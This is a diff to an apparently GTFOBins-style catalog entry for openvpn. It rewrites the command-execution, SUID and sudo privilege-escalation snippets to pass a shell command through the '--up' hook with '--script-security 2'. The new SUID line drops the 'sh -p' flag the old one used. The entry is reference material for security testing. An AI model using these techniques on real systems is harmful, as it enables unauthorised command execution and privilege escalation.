@@ -3,25 +3,13 @@ functions:
   command:
     - code: |
         COMMAND='id'
-        TF=$(mktemp)
-        echo '#!/usr/bin/env sh' > $TF
-        echo "$COMMAND" >> $TF
-        chmod +x $TF
-        openvpn --dev tun0 --script-security 2 --up $TF
+        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
   suid:
     - code: |
         COMMAND='id'
-        TF=$(mktemp)
-        echo '#!/usr/bin/env -S sh -p' > $TF
-        echo "$COMMAND" >> $TF
-        chmod +x $TF
-        openvpn --dev tun0 --script-security 2 --up $TF
+        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
   sudo:
     - code: |
         COMMAND='id'
-        TF=$(mktemp)
-        echo '#!/usr/bin/env sh' > $TF
-        echo "$COMMAND" >> $TF
-        chmod +x $TF
-        sudo openvpn --dev tun0 --script-security 2 --up $TF
+        sudo openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
 ---
